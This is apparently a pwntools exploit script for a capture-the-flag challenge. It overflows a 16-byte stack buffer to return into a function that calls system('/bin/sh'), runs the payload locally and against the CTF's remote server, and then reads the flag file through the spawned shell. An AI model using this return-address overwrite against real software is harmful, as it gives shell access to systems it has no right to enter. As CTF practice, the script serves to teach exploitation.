#!/usr/bin/env python3
from pwn import *

# Handout: chall.c, bin/chall, Dockerfile

# shell_land ();
# 0x00401196      endbr64
# 0x0040119a      push    rbp
# 0x0040119b      mov     rbp, rsp
# 0x0040119e      lea     rdi, str.bin_sh ; 0x402008 ; const char *string
# 0x004011a5      call    system     ; sym.imp.system ; int system(const char *string)
# 0x004011aa      nop
# 0x004011ab      pop     rbp
# 0x004011ac      ret

if __name__ == "__main__":
    # context.log_level = "debug"
    chall = ELF("bin/chall")
    shell_land = chall.symbols["shell_land"]
    assert shell_land == 0x00401196

    # This is not required on my kali virtualbox vm.
    # I'm not entirely sure why it is necessary on the remote (and in a ubuntu:focal-20220404 docker image (see setup_ubuntu.sh)).
    shell_land = 0x0040119e

    rbp = 0x0
    buffer = b"x" * 16 + p64(rbp) + p64(shell_land) + b"\n"

    with process(chall.path) as p:
        print(p.recv())
        p.send(buffer)
        pause(1)
        p.sendline(b"cat bin/flag.txt")
        print(p.recv())

    with remote("tjc.tf", 31680) as p:
        print(p.recv())
        p.send(buffer)
        pause(1)
        p.sendline(b"cat flag.txt")
        print(p.recv())

